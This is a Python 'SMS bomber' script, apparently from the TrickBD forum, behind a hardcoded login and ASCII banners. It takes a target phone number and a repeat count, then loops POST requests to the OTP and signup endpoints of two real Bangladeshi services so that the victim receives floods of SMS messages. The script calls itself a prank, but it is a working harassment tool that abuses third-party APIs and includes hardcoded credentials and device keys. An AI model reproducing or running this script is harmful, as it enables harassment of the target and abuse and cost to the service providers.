# You Can Change The Key's Name. But don't Change The Values.

# Reset
color_off="\033[0m"       # Text Reset

# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White

# Bold
bblack="\033[1;30m"       # Black
bred="\033[1;31m"         # Red
bgreen="\033[1;32m"       # Green
byellow="\033[1;33m"      # Yellow
bblue="\033[1;34m"        # Blue
bpurple="\033[1;35m"      # Purple
bcyan="\033[1;36m"        # Cyan
bwhite="\033[1;37m"       # White

# Underline
ublack="\033[4;30m"       # Black
ured="\033[4;31m"         # Red
ugreen="\033[4;32m"       # Green
uyellow="\033[4;33m"      # Yellow
ublue="\033[4;34m"        # Blue
upurple="\033[4;35m"      # Purple
ucyan="\033[4;36m"        # Cyan
uwhite="\033[4;37m"       # White

# Background
on_black="\033[40m"       # Black
on_red="\033[41m"         # Red
on_green="\033[42m"       # Green
on_yellow="\033[43m"      # Yellow
on_blue="\033[44m"        # Blue
on_purple="\033[45m"      # Purple
on_cyan="\033[46m"        # Cyan
on_white="\033[47m"       # White

# High Intensty
iblack="\033[0;90m"       # Black
ired="\033[0;91m"         # Red
igreen="\033[0;92m"       # Green
iyellow="\033[0;93m"      # Yellow
iblue="\033[0;94m"        # Blue
ipurple="\033[0;95m"      # Purple
icyan="\033[0;96m"        # Cyan
iwhite="\033[0;97m"       # White

# Bold High Intensty
biblack="\033[1;90m"      # Black
bired="\033[1;91m"        # Red
bigreen="\033[1;92m"      # Green
biyellow="\033[1;93m"     # Yellow
biblue="\033[1;94m"       # Blue
bipurple="\033[1;95m"     # Purple
bicyan="\033[1;96m"       # Cyan
biehite="\033[1;97m"      # White

# High Intensty backgrounds
on_iblack="\033[0;100m"   # Black
on_ired="\033[0;101m"     # Red
on_igreen="\033[0;102m"   # Green
on_iyellow="\033[0;103m"  # Yellow
on_iblue="\033[0;104m"    # Blue
on_ipurple="\033[10;95m"  # Purple
on_icyan="\033[0;106m"    # Cyan
on_iwhite="\033[0;107m"   # White


# From TrickBD By ROC-X

print(biblue+"""
███████  █████  ██   ██ ██ ██████  
   ███  ██   ██ ██   ██ ██ ██   ██ 
  ███   ███████ ███████ ██ ██   ██ 
 ███    ██   ██ ██   ██ ██ ██   ██ 
███████ ██   ██ ██   ██ ██ ██████  
                                    """)

import sys



usern="NICOTINLOVER"
passwd="ZAHID"
inpuser=str(input(biyellow+"ENTER USERNAME: "))
inppass=str(input(" ENTER PASSWORD: "))
if inpuser==usern and inppass==passwd:
	 print("[√]User & Password Correct ")
	 pass
else:
	print(bired+" [×]Your Entered Wrong Username or Password")
	sys.exit()

print(bblue+"Assalamualaiqum Bro 🥰🥰")
print(bired+"""
d8888b.                                  888 Y88b   d88P 
d88P  Y88b                                 888  Y88b d88P  
Y88b.                                      888   Y88o88P   
 "Y888b.   88888b.   .d88b.   .d88b.   .d88888    Y888P    
    "Y88b. 888 "88b d8P  Y8b d8P  Y8b d88" 888    d888b    
      "888 888  888 88888888 88888888 888  888   d88888b   
Y88b  d88P 888 d88P Y8b.     Y8b.     Y88b 888  d88P Y88b  
 "Y8888P"  88888P"   "Y8888   "Y8888   "Y88888 d88P   Y88b 
           888                                             
           888                                             
           888
 """)
print(bipurple+"Welcome To My BomBer.🥱. Itz.Abdullah  Zahid..It Is Only For Prank🥵🥵. You Shouldn’t Think It Seriously 🤧🤧")


import requests
from requests.structures import CaseInsensitiveDict
number=str(input(bicyan+"Enter Your Target  Number:"))
amount=int(input("Enter The Amount: "))
url11 = "https://ss.binge.buzz/otp/send/login"

headers11 = CaseInsensitiveDict()
headers11["Content-Type"] = "application/x-www-form-urlencoded"

data11 = {"phone":number}



url8 = "https://www.mydrivebd.com/sapi/profile?action=signup&notify=true&rid=0.23183502639972242&validationkey=466429644f202f6120572a682b495374"

headers8 = CaseInsensitiveDict()
headers8["Content-Type"] = "application/json;charset=UTF-8"
headers8["x-deviceid"] = "web-d881a3b625c9fbbcaa2ae2ac2c8bb061"

data8 = """{
  \"data\": {
    \"user\": {
      \"generic\": {
        \"userid\": \"88"""+number+"""\",
        \"password\": \"niilahmed281\",
        \"l10n\": \"en\",
        \"acceptedtermsandconditions\": true
      }
    }
  }
}"""
for i in range (amount):
  	  x = requests.post(url8,headers=headers8,data=data8)
  	  x = requests.post(url11, headers=headers11,data=data11)
  	  print(bigreen+"[√]Sms🚀🚀 Sent Successful🆘")